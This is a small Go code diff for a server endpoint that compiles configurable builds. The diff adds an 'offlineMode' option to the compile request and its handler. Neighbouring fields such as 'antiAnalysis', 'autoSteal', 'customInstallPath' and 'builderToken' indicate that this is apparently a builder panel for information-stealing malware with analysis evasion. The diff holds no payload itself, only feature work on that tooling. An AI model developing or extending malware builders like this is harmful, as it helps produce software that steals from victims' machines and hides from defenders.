@@ -33,6 +33,7 @@ type compileConfigRequest struct {
 	CustomInstallPath   string `json:"customInstallPath"`
 	AntiAnalysis        string `json:"antiAnalysis"`
 	AutoSteal           string `json:"autoSteal"`
+	OfflineMode         bool   `json:"offlineMode"`
 }
 
 func (s *Server) handleCompileGo(w http.ResponseWriter, r *http.Request) {
@@ -161,6 +162,7 @@ func (s *Server) handleCompileGoConfig(w http.ResponseWriter, r *http.Request) {
 		CustomInstallPath:   strings.TrimSpace(req.CustomInstallPath),
 		AntiAnalysis:        strings.TrimSpace(req.AntiAnalysis),
 		AutoSteal:           strings.TrimSpace(req.AutoSteal),
+		OfflineMode:         req.OfflineMode,
 		Owner:               login,
 		BuilderToken:        strings.TrimSpace(builderToken),
 		ServerHost:          strings.TrimSpace(r.Host),
